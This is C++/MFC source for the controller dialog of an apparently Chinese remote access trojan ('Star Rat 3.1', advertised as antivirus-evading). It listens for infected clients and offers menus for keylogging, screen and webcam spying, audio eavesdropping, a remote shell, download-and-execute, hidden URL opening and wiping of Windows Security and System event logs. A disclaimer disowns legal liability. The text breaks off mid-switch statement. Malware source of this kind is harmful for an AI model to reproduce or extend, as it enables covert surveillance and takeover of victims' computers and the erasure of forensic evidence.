
// GfiRatServerDlg.cpp: 实现文件
//

#include "pch.h"
#include "framework.h"
#include "GfiRatServer.h"
#include "GfiRatServerDlg.h"
#include "afxdialogex.h"


#include "FileManagerDlg.h"
#include "ScreenSpyDlg.h"
#include "newScreenSpyDlg.h"
#include "SystemDlg.h"
#include "WebCamDlg.h"
#include "AudioDlg.h"
#include "SpeakerDlg.h"
#include "KeyBoardDlg.h"
#include "ShellDlg.h"
#include "SysInfo.h"
#include "RegDlg.h"
#include "SerManager.h"
#include "ProxyDlg.h"
#include "MsgBox.h"
#include "Chat.h"
#include "BUID.h"
#include "Setting.h"
#include "InputDlg.h"



#ifdef _DEBUG
#define new DEBUG_NEW
#endif

CIOCPServer* m_iocpServer = NULL;
CGfiRatServerDlg* g_pFrame; // 在CMainFrame::CMainFrame()中初始化

// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CGfiRatServerDlg 对话框
typedef struct
{
	char* title;
	int		nWidth;
}COLUMNSTRUCT;

COLUMNSTRUCT g_Log_Data[] =
{
	{_T("时间"),			20	},
	{_T("事件"),			70	},
	{_T("等级"),			10	}
};

int g_Log_Width = 0;
int	g_Log_Count = (sizeof(g_Log_Data) / 8);

COLUMNSTRUCT g_Column_Data[] =
{
	{_T("外网-IP"),			135	},//0
	{_T("内网-IP"),			100	},//1
	{_T("名称"),			80	},//2
	{_T("系统"),			80	},//3
	{_T("CPU"),				85	},//4
	{_T("内存"),			65  },//5
	{_T("延迟"),			45	},//6
	{_T("视频"),		   	40	},//7
	{_T("筛选"),		  	40	},//8
	{_T("DDOS"),		   	57	},//9
	{_T("版本"),			40	},//10
	{_T("地理位置"),		110	},//11
		{_T("杀毒"),		110	},// 12
};

int g_Column_Width = 0;
int	g_Column_Count = (sizeof(g_Column_Data) / 8);





























CGfiRatServerDlg::CGfiRatServerDlg(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_GFIRATSERVER_DIALOG, pParent)
{
	m_bSetRestart = NULL;
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CGfiRatServerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST2, g_pLogView);
	DDX_Control(pDX, IDC_LIST1, g_pConnectView);
}

BEGIN_MESSAGE_MAP(CGfiRatServerDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_CONTEXTMENU()
	ON_NOTIFY(NM_CUSTOMDRAW, IDC_LIST2, &CGfiRatServerDlg::OnCustomdrawList2)
	ON_NOTIFY(NM_RCLICK, IDC_LIST2, &CGfiRatServerDlg::OnRclickList2)
	ON_COMMAND(IDM_EVENT_COPY, &CGfiRatServerDlg::OnEventCopy)
	ON_COMMAND(IDM_EVENT_DELETE, &CGfiRatServerDlg::OnEventDelete)
	ON_COMMAND(IDM_EVENT_SAVE, &CGfiRatServerDlg::OnEventSave)
	ON_COMMAND(IDM_ALL_DELETE, &CGfiRatServerDlg::OnAllDelete)
	ON_COMMAND(IDM_FILEMANAGER, &CGfiRatServerDlg::OnFilemanager)
	ON_COMMAND(IDM_KEYBOARD, &CGfiRatServerDlg::OnKeyboard)
	ON_COMMAND(IDM_SCREENSPY, &CGfiRatServerDlg::OnScreenspy)
	ON_COMMAND(IDM_SYSTEM, &CGfiRatServerDlg::OnSystem)
	ON_COMMAND(IDM_WEBCAM, &CGfiRatServerDlg::OnWebcam)
	ON_COMMAND(IDM_AUDIO_LISTEN, &CGfiRatServerDlg::OnAudioListen)
	ON_COMMAND(IDM_REMOTESHELL, &CGfiRatServerDlg::OnRemoteshell)
	ON_COMMAND(IDM_SYSINFO, &CGfiRatServerDlg::OnSysinfo)
	ON_COMMAND(IDM_REGEDIT, &CGfiRatServerDlg::OnRegedit)
	ON_COMMAND(ID_JINCHENG, &CGfiRatServerDlg::OnJincheng)
	ON_COMMAND(ID_CHUANGKOU, &CGfiRatServerDlg::OnChuangkou)
	ON_COMMAND(ID_CHONGZHI, &CGfiRatServerDlg::OnChongzhi)
	ON_COMMAND(IDM_DOWNEXEC, &CGfiRatServerDlg::OnDownexec)
	ON_COMMAND(IDM_OPEN_URL_HIDE, &CGfiRatServerDlg::OnOpenUrlHide)
	ON_COMMAND(IDM_OPEN_URL_SHOW, &CGfiRatServerDlg::OnOpenUrlShow)
	ON_COMMAND(IDM_CLEANEVENT, &CGfiRatServerDlg::OnCleanevent)
	ON_COMMAND(IDM_CLEAN_System, &CGfiRatServerDlg::OnCleanSystem)
	ON_COMMAND(IDM_CLEAN_Security, &CGfiRatServerDlg::OnCleanSecurity)
	ON_COMMAND(IDM_CLEAN_Application, &CGfiRatServerDlg::OnCleanApplication)
	ON_COMMAND(IDM_IP, &CGfiRatServerDlg::OnIp)
	ON_COMMAND(IDM_DILIXINXI, &CGfiRatServerDlg::OnDilixinxi)
	ON_COMMAND(IDM_ALL, &CGfiRatServerDlg::OnAll)
	ON_COMMAND(IDM_REMOVE, &CGfiRatServerDlg::OnRemove)
	ON_COMMAND(IDM_LOGOFF, &CGfiRatServerDlg::OnLogoff)
	ON_COMMAND(IDM_REBOOT, &CGfiRatServerDlg::OnReboot)
	ON_COMMAND(IDM_SHUTDOWN, &CGfiRatServerDlg::OnShutdown)
	ON_COMMAND(IDM_RENAME_REMARK, &CGfiRatServerDlg::OnRenameRemark)
	ON_COMMAND(IDM_CHANGE_GROUP, &CGfiRatServerDlg::OnChangeGroup)
	ON_COMMAND(IDM_SELECT_ALL, &CGfiRatServerDlg::OnSelectAll)
	ON_COMMAND(IDM_UNSELECT_ALL, &CGfiRatServerDlg::OnUnselectAll)
	ON_MESSAGE(WM_ADDFINDGROUP, &CGfiRatServerDlg::OnAddfindgroup)
	ON_MESSAGE(WM_REMOVEFROMLIST, &CGfiRatServerDlg::OnRemovefromlist)
	ON_MESSAGE(WM_ADDTOLIST, &CGfiRatServerDlg::OnAddtolist)
	ON_NOTIFY(NM_RCLICK, IDC_LIST1, &CGfiRatServerDlg::OnRclickList1)
	ON_MESSAGE(WM_OPENSHELLDIALOG, &CGfiRatServerDlg::OnOpenshelldialog)
	ON_MESSAGE(WM_OPENMANAGERDIALOG, &CGfiRatServerDlg::OnOpenmanagerdialog)
	ON_MESSAGE(WM_OPENKEYBOARDDIALOG, &CGfiRatServerDlg::OnOpenkeyboarddialog)
	ON_MESSAGE(WM_OPENSCREENSPYDIALOG, &CGfiRatServerDlg::OnOpenscreenspydialog)
	ON_MESSAGE(WM_OPENPSLISTDIALOG, &CGfiRatServerDlg::OnOpenpslistdialog)
	ON_COMMAND(IDM_UPDATE_SERVER, &CGfiRatServerDlg::OnUpdateServer)
	ON_MESSAGE(WM_OPENWEBCAMDIALOG, &CGfiRatServerDlg::OnOpenwebcamdialog)
	ON_MESSAGE(WM_OPENAUDIODIALOG, &CGfiRatServerDlg::OnOpenaudiodialog)
	ON_MESSAGE(WM_OPENSYSINFODIALOG, &CGfiRatServerDlg::OnOpensysinfodialog)
	ON_MESSAGE(WM_OPENREGEDITDIALOG, &CGfiRatServerDlg::OnOpenregeditdialog)
	ON_COMMAND(IDM_newSCREENSPY, &CGfiRatServerDlg::Onnewscreenspy)
	ON_MESSAGE(WM_newOPENSCREENSPYDIALOG, &CGfiRatServerDlg::OnNewopenscreenspydialog)
	ON_COMMAND(IDM_SPEAKER_LISTEN, &CGfiRatServerDlg::OnSpeakerListen)
	ON_MESSAGE(WM_OPENSPEAKERDIALOG, &CGfiRatServerDlg::OnOpenspeakerdialog)
	ON_COMMAND(IDM_SERMANAGER, &CGfiRatServerDlg::OnSermanager)
	ON_MESSAGE(WM_OPENPSERLISTDIALOG, &CGfiRatServerDlg::OnOpenpserlistdialog)
	ON_COMMAND(IDM_SHOWMSG, &CGfiRatServerDlg::OnShowmsg)
	ON_COMMAND(IDM_CHAT, &CGfiRatServerDlg::OnChat)
	ON_MESSAGE(WM_OPENCHATDIALOG, &CGfiRatServerDlg::OnOpenchatdialog)
	ON_COMMAND(IDM_PROXY, &CGfiRatServerDlg::OnProxy)
	ON_MESSAGE(WM_OPENPROXYDIALOG, &CGfiRatServerDlg::OnOpenproxydialog)
	ON_COMMAND(ID_DESK_LOOK, &CGfiRatServerDlg::OnDeskLook)
	ON_COMMAND(IDM_EXIT, &CGfiRatServerDlg::OnExit)
	ON_WM_CLOSE()
	ON_COMMAND(IDM_BUILD, &CGfiRatServerDlg::OnBuild)
	ON_COMMAND(IDM_SETTING, &CGfiRatServerDlg::OnSetting)
	ON_WM_SIZE()
END_MESSAGE_MAP()


// CGfiRatServerDlg 消息处理程序

BOOL CGfiRatServerDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();
	g_pFrame = this;
	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);
	//系统菜单
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != nullptr)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	//菜单
	m_Menu.LoadMenu(IDR_MAINFRAME);
	SetMenu(&m_Menu);
	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码

	//初始化IP地理位置

	if (((CGfiRatServerApp*)AfxGetApp())->m_bIsQQwryExist)
	{
		m_QQwry = new SEU_QQwry;
		m_QQwry->SetPath("qqwry.dat");
	}

	 //创建状态栏
	m_wndStatusBar.Create(this);
	//创建两个面板//第一个面板是1,第二个面板是2
	UINT nID[] = { 1,2,3,4 };
	m_wndStatusBar.SetIndicators(nID, 4);
	CRect rect = NULL;
	GetClientRect(&rect);
	//设置面板1信息 ,第一个面板,编号为1,正常显示,宽度为100
	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_NORMAL, rect.right / 100 * 25);
	m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL, rect.right / 100 * 6);
	m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, rect.right / 100 * 60);
	m_wndStatusBar.SetPaneInfo(3, m_wndStatusBar.GetItemID(3), SBPS_STRETCH, 0);
	//设置状态栏位置

	//rect.bottom - 20是状态栏的高度位置,20是状态的高度
	m_wndStatusBar.MoveWindow(0, rect.bottom - 20, rect.right, 20);
	m_wndStatusBar.SetPaneText(0, "\t就绪，等待客户");

	m_wndStatusBar.SetPaneText(2, "\tNT:[%d] Win2000:[%d] XP:[%d] Win2003:[%d] Vista:[%d] Win2008:[%d] Win7:[%d] Win8:[%d] Win2012:[%d] Win10:[%d] Win2016:[%d]");
	m_wndStatusBar.SetPaneText(3, "\tOnline: 0");


	//日志列表
	HIMAGELIST hImageListSmall = NULL;
	Shell_GetImageLists(NULL, &hImageListSmall);
	ListView_SetImageList(g_pLogView.m_hWnd, hImageListSmall, LVSIL_SMALL);

	g_pLogView.SetExtendedStyle(LVS_EX_FULLROWSELECT);

	for (int i = 0; i < g_Log_Count; i++)
	{
		g_pLogView.InsertColumn(i, g_Log_Data[i].title);
		g_pLogView.SetColumnWidth(i, g_Log_Data[i].nWidth* rect.right/100/2);
		g_Log_Width += g_Log_Data[i].nWidth; // 总宽度
	}


	//主列表
	 hImageListSmall = NULL;
	Shell_GetImageLists(NULL, &hImageListSmall);
	ListView_SetImageList(g_pConnectView.m_hWnd, hImageListSmall, LVSIL_SMALL);

	g_pConnectView.SetExtendedStyle(LVIF_PARAM | LVS_EX_FULLROWSELECT | LVS_EX_UNDERLINEHOT | LVS_EX_SUBITEMIMAGES);

	for (int i = 0; i < g_Column_Count; i++)
	{
		g_pConnectView.InsertColumn(i, g_Column_Data[i].title);
		g_pConnectView.SetColumnWidth(i, g_Column_Data[i].nWidth);
		g_Column_Width += g_Column_Data[i].nWidth; // 总宽度
	}


	
	// 启动IOCP服务器
	int	nPort = ((CGfiRatServerApp*)AfxGetApp())->m_IniFile.GetInt("Settings", "ListenPort");
	int	nMaxConnection = ((CGfiRatServerApp*)AfxGetApp())->m_IniFile.GetInt("Settings", "MaxConnection");
	if (nPort == 0)
		nPort = 9998;
	if (nMaxConnection == 0)
		nMaxConnection = 10000;

	if (((CGfiRatServerApp*)AfxGetApp())->m_IniFile.GetInt("Settings", "MaxConnectionAuto"))
		nMaxConnection = 8000;
	Activate(nPort, nMaxConnection);
	
	int cx = 1519, cy = 765;
	if (g_pConnectView.m_hWnd != NULL)   //（控件也是窗口因此也有句柄）
	{
		CRect rc;
		rc.left = 1;          //列表的左坐标     
		rc.top = 1;         //列表的上坐标
		rc.right = cx - 1;    //列表的右坐标
		rc.bottom = cy - 200;   //列表的下坐标
		g_pConnectView.MoveWindow(rc);

		for (int i = 0; i < g_Column_Count; ++i) {           //遍历每一个列
			double Temp = g_Column_Data[i].nWidth;     //得到当前列的宽度   138
			Temp /= g_Column_Width;                    //看一看当前宽度占总长度的几分之几
			Temp *= cx;                                       //用原来的长度乘以所占的几分之几得到当前的宽度
			int lenth = Temp;                               //转换为int 类型
			g_pConnectView.SetColumnWidth(i, (lenth));       //设置当前的宽度
		}
	}

	if (g_pLogView.m_hWnd != NULL)
	{
		CRect rc;
		rc.left = 1;         //列表的左坐标
		rc.top = cy - 196;     //列表的上坐标
		rc.right = cx - 1;    //列表的右坐标
		rc.bottom = cy - 45;   //列表的下坐标
		g_pLogView.MoveWindow(rc);
		for (int i = 0; i < g_Log_Count; ++i) {           //遍历每一个列
			double Temp = g_Log_Data[i].nWidth;     //得到当前列的宽度
			Temp /= g_Log_Width;                    //看一看当前宽度占总长度的几分之几
			Temp *= cx;                                        //用原来的长度乘以所占的几分之几得到当前的宽度
			int lenth = Temp;                                  //转换为int 类型
			g_pLogView.SetColumnWidth(i, (lenth));        //设置当前的宽度
		}
	}

	if (m_wndStatusBar.m_hWnd != NULL) {    //当对话框大小改变时 状态条大小也随之改变
		CRect Rect;
		Rect.left = 1;
		Rect.top = cy - 41;

		Rect.right = cx;
		Rect.bottom = cy-20;
		m_wndStatusBar.MoveWindow(Rect);
		//m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_POPOUT, cx - 10);
	}
	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CGfiRatServerDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CGfiRatServerDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CGfiRatServerDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}


void CGfiRatServerDlg::Activate(UINT nPort, UINT nMaxConnections)
{
	char temp[50];
	sprintf(temp, "\t端口:%d", nPort);
	m_wndStatusBar.SetPaneText(1, temp);
	CString		str, strLogText;
	if (m_iocpServer != NULL)
	{
		m_iocpServer->Shutdown();
		delete m_iocpServer;

	}
	m_iocpServer = new CIOCPServer;

	InsertLogItem("请合理使用本程序，因为本程序所造成的任何法律责任作者不予承担", 0, 43);

	// 开启IPCP服务器
	if (m_iocpServer->Initialize(NotifyProc, this, 100000, nPort))
	{
		CString IP;

		char hostname[256];
		gethostname(hostname, sizeof(hostname));
		HOSTENT* host = gethostbyname(hostname);
		if (host != NULL)
			IP = inet_ntoa(*(IN_ADDR*)host->h_addr_list[0]);
		else
			IP = _T("127.0.0.1");

		ShowWindow(SW_SHOW);
		UpdateWindow();
		CString web;
		web.Format(_T("%s:%d"), IP, nPort);
		m_wndStatusBar.SetPaneText(0, web);
		strLogText.Format("%s   监听端口: [%d]", "欢迎使用 Star Rat 3.1", nPort);
		InsertLogItem(strLogText, 0, 43);
	}
	else
	{
		str.Format(_T("端口 %d 监听失败"), nPort);
		AfxMessageBox(str);
		ShowWindow(SW_SHOW);
		UpdateWindow();
		m_wndStatusBar.SetPaneText(0, str);
		strLogText.Format("%s   端口[%d]监听失败", "欢迎使用 Star Rat 3.1免杀远控[独特论坛专用版]", nPort);
		InsertLogItem(strLogText, 0, 43);
	}
	m_wndStatusBar.SetPaneText(2, _T("Online: 0"));
	
}

//日志列表处理

#if 1

void CGfiRatServerDlg::OnCustomdrawList2(NMHDR* pNMHDR, LRESULT* pResult)
{
	NMLVCUSTOMDRAW* pLVCD = (NMLVCUSTOMDRAW*)(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	*pResult = CDRF_NEWFONT;
	if (pLVCD->nmcd.dwDrawStage == CDDS_PREPAINT)
	{
		*pResult = CDRF_NOTIFYITEMDRAW;
	}
	else if (pLVCD->nmcd.dwDrawStage == CDDS_ITEMPREPAINT)
	{
		COLORREF   m_crTextBk, m_clrText;
		int nItem = static_cast<int> (pLVCD->nmcd.dwItemSpec);

		CString str = g_pLogView.GetItemText(nItem, 1);
		bool bDBImplFail = false;
		if (str.Find(_T("主机下线")) == 0)
		{
			m_crTextBk = RGB(255, 255, 255);
			m_clrText = RGB(200, 0, 200); //粉色
		}
		else
			if (str.Find(_T("主机上线")) == 0)
			{
				m_crTextBk = RGB(255, 255, 255);
				m_clrText = RGB(0, 100, 255);
			}
			else
				if (str.Find(_T("欢迎使用")) == 0)
				{
					m_crTextBk = RGB(255, 255, 255);
					m_clrText = RGB(0, 100, 250);
				}
				else
					if (str.Find(_T("已经开始测试")) == 0)
					{
						m_crTextBk = RGB(255, 255, 255);
						m_clrText = RGB(0, 180, 250);
					}
					else
						if (str.Find(_T("已经停止测试")) == 0)
						{
							m_crTextBk = RGB(255, 255, 255);
							m_clrText = RGB(0, 180, 125);
						}
						else
						{
							m_crTextBk = RGB(255, 255, 255);
							m_clrText = RGB(0, 0, 0);//黑色
						}
		pLVCD->clrTextBk = m_crTextBk;
		pLVCD->clrText = m_clrText;
		*pResult = CDRF_DODEFAULT;
	}
	*pResult = 0;
}


void CGfiRatServerDlg::OnRclickList2(NMHDR* pNMHDR, LRESULT* pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	CMenu	popup;
	popup.LoadMenu(IDR_LOG);
	CMenu* pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);
		pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);
	*pResult = 0;

}


void CGfiRatServerDlg::OnEventCopy()
{
	// TODO: 在此添加命令处理程序代码
	int nItem;
	CString strText(_T(""));
	POSITION pos = g_pLogView.GetFirstSelectedItemPosition();
	if (pos == NULL)
	{
		::MessageBox(NULL, "Please Select Event ...", "Notice", MB_ICONINFORMATION);
		return;
	}
	else
	{
		//获取所有选中项目的内容。
		while (pos)
		{
			nItem = g_pLogView.GetNextSelectedItem(pos);
			strText += g_pLogView.GetItemText(nItem, 0) + " ";
			strText += g_pLogView.GetItemText(nItem, 1) + _T("\r\n");
		}
		//将内容保存到剪贴板。
		if (!strText.IsEmpty())
		{
			if (OpenClipboard())
			{
				EmptyClipboard();
				HGLOBAL hClipboardData = GlobalAlloc(GHND | GMEM_SHARE, (strText.GetLength() + 1) * sizeof(TCHAR));
				if (hClipboardData)
				{
					TCHAR* pszData = (TCHAR*)GlobalLock(hClipboardData);
					_tcscpy(pszData, strText);
					GlobalUnlock(hClipboardData);
					SetClipboardData(CF_TEXT, hClipboardData);
				}
				CloseClipboard();
			}
		}
	}
}


void CGfiRatServerDlg::OnEventDelete()
{
	// TODO: 在此添加命令处理程序代码
	POSITION pos = g_pLogView.GetFirstSelectedItemPosition();
	if (pos == NULL)
	{
		::MessageBox(NULL, "Please Select Event ...", "Notice", MB_ICONINFORMATION);
		return;
	}
	else
	{
		while (pos)
		{
			int nItem = g_pLogView.GetNextSelectedItem(pos);
			g_pLogView.DeleteItem(nItem);
			pos = g_pLogView.GetFirstSelectedItemPosition();
		}
	}
}


void CGfiRatServerDlg::OnEventSave()
{
	// TODO: 在此添加命令处理程序代码
	// TODO: Add your command handler code here
	POSITION pos = g_pLogView.GetFirstSelectedItemPosition();
	if (pos == NULL)
	{
		::MessageBox(NULL, "Please Select Event ...", "Notice", MB_ICONINFORMATION);
		return;
	}
	else
	{
		CTime time = CTime::GetCurrentTime(); ///构造CTime对象 
		CString strTime = time.Format("%Y-%m-%d %H-%M-%S");

		CFileDialog dlg(FALSE, _T("log"), strTime, OFN_OVERWRITEPROMPT, _T("*.log|*.log|*.txt|*.log"), NULL);
		if (dlg.DoModal() != IDOK)
			return;
		CFile file;
		char strip[50] = { 0 };
		if (file.Open(dlg.GetPathName(), CFile::modeCreate | CFile::modeWrite))
		{
			while (pos)
			{
				int nItem = g_pLogView.GetNextSelectedItem(pos);
				CString strTitle;
				strTitle.Format(_T("Time:%s	Event:%s"), g_pLogView.GetItemText(nItem, 0), g_pLogView.GetItemText(nItem, 1));
				char* strip = strTitle.GetBuffer(strTitle.GetLength() + 1);	//CString转换为char*
				strTitle.ReleaseBuffer();
				strcat(strip, "\r\n");
				file.Write(strip, strlen(strip));
				memset(strip, 0, 50);
			}
			file.Close();
			strTime = time.Format("[%Y-%m-%d %H:%M:%S]") + " Event Saved ...";
			::MessageBox(0, strTime, "Notice", MB_ICONINFORMATION);
		}
	}
}


void CGfiRatServerDlg::OnAllDelete()
{
	// TODO: 在此添加命令处理程序代码
	g_pLogView.DeleteAllItems();
}



void CGfiRatServerDlg::InsertLogItem(LPCTSTR Text, LPCTSTR Mode, int Flag)
{
	char m_Text[512] = { 0 };
	CTime time = CTime::GetCurrentTime();		//构造CTime对象 
	CString strTime = time.Format("[%Y-%m-%d %H:%M:%S]");
	g_pLogView.InsertItem(0, strTime, Flag);//图片
	g_pLogView.SetItemText(0, 1, Text);  //BOOL SetItemText( int nItem, int nSubItem, LPTSTR lpszText );
	g_pLogView.SetItemText(0, 2, Mode); //事件等级
}

#endif



//主回调函数处理
#if 1

void CALLBACK CGfiRatServerDlg::NotifyProc(LPVOID lpParam, ClientContext* pContext, UINT nCode)
{
	try
	{
		CGfiRatServerDlg* pFrame = (CGfiRatServerDlg*)lpParam;
		CString str;
		switch (nCode)
		{
		case NC_CLIENT_CONNECT:
			break;
		case NC_CLIENT_DISCONNECT:
			pFrame->PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);
			break;
		case NC_TRANSMIT:
			break;
		case NC_RECEIVE:
		ProcessReceive(pContext);
			break;
		case NC_RECEIVE_COMPLETE:
		ProcessReceiveComplete(pContext);
			break;
		}
	}
	catch (...) {}
}



void CGfiRatServerDlg::ProcessReceiveComplete(ClientContext* pContext)
{
	if (pContext == NULL)
		return;

	// 如果管理对话框打开，交给相应的对话框处理
	CDialog* dlg = (CDialog*)pContext->m_Dialog[1];

	// 交给窗口处理
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{
		case FILEMANAGER_DLG:
			((CFileManagerDlg*)dlg)->OnReceiveComplete();
			break;
		case SCREENSPY_DLG:
			((CScreenSpyDlg*)dlg)->OnReceiveComplete();
			break;
		case newSCREENSPY_DLG:
			((newCScreenSpyDlg*)dlg)->OnReceiveComplete();
			break;
		case WEBCAM_DLG:
			((CVideoDlg*)dlg)->OnReceiveComplete();
			break;
		case AUDIO_DLG:
			((CAudioDlg*)dlg)->OnReceiveComplete();
			break;
		case SPEAKER_DLG:
			((CSpeakerDlg*)dlg)->OnReceiveComplete();
			break;
		case KEYBOARD_DLG:
			((CKeyBoardDlg*)dlg)->OnReceiveComplete();
			break;
		case SYSTEM_DLG:
			((CSystemDlg*)dlg)->OnReceiveComplete();
			break;
		case SHELL_DLG:
			((CShellDlg*)dlg)->OnReceiveComplete();
			break;
		case SYSINFO_DLG:
			((CSysInfo*)dlg)->OnReceiveComplete();
			break;
		case REGEDIT_DLG:             //注册表
			((CRegDlg*)dlg)->OnReceiveComplete();
			break;
		case SERMANAGER_DLG:  //服务管理
			((CSerManager*)dlg)->OnReceiveComplete();
			break;
		case CHAT_DLG:        //远程交谈
			((CChat*)dlg)->OnReceiveComplete();
			break;
		case DLL_DLG:
		///	((CDllDlg*)dlg)->OnReceiveComplete();
			break;
		case PROXY_DLG:
			((CProxyDlg*)dlg)->OnReceiveComplete();
			break;
		default:
			break;
		}
		return;
	}

	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_AUTH: // 要求验证
	{
		CString		m_PassWord = "password";
		m_iocpServer->Send(pContext, (PBYTE)m_PassWord.GetBuffer(0), m_PassWord.GetLength() + 1);
	}
		break;
	case TOKEN_HEARTBEAT: // 回复心跳包
	{
		BYTE	bToken = COMMAND_ACTIVED;
		m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
	}
	break;
	case TOKEN_LOGIN: // 上线包
	{
		pContext->m_bIsMainSocket = true;
		g_pFrame->PostMessage(WM_ADDFINDGROUP, 0, (LPARAM)pContext);
	}
	break;
	case COMMAND_GN:
	{
		switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[1])
		{
		case DESK_TOP:
		{
			//保存BMP图像
			//时间
			time_t now = time(0);
			tm* ltm = localtime(&now);
			char Ttime[MAX_PATH];
			char szPath[MAX_PATH] = { 0 };
			GetModuleFileNameA(NULL, szPath, MAX_PATH);
			(_tcsrchr(szPath, _T('\\')))[1] = 0;//删除文件名，只获得路径 字串
			CString strPath;
			for (int n = 0; szPath[n]; n++)
			{
				if (szPath[n] != _T('\\'))
				{
					strPath += szPath[n];
				}
				else
				{
					strPath += _T("\\\\");
				}
			}
			sprintf(Ttime, "%s\\temp\\%d日%d-%d-%d.bmp", szPath,ltm->tm_mday, ltm->tm_hour, ltm->tm_min, ltm->tm_sec);
			  FILE * hFile = fopen(Ttime, "wb+");
			  if (nullptr != hFile)
				  {
				     size_t count = fwrite(pContext->m_DeCompressionBuffer.GetBuffer(2), 1, pContext->m_DeCompressionBuffer.GetBufferLen() - 2, hFile);
				    fclose(hFile);
				   }
			
			  HINSTANCE hNewExe = ShellExecuteA(NULL, "open", Ttime, NULL, NULL, SW_SHOW);
			  //remove(Ttime);
		}
		default:
			break;
		}
		break;
	}
	case TOKEN_DRIVE_LIST: // 驱动器列表
		g_pFrame->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_BITMAPINFO: //
		g_pFrame->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_newBITMAPINFO: // 指接调用public函数非模态对话框会失去反应， 不知道怎么回事
		g_pFrame->PostMessage(WM_newOPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_WEBCAM_BITMAPINFO: // 摄像头
		g_pFrame->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_AUDIO_START: // 语音
		g_pFrame->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SPEAK_START: // 扬声器
		g_pFrame->PostMessage(WM_OPENSPEAKERDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_KEYBOARD_START:
		g_pFrame->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_CSystemManager:
		g_pFrame->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SHELL_START:
		g_pFrame->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SYSINFOLIST:
		g_pFrame->PostMessage(WM_OPENSYSINFODIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_REGEDIT:		//注册表管理    
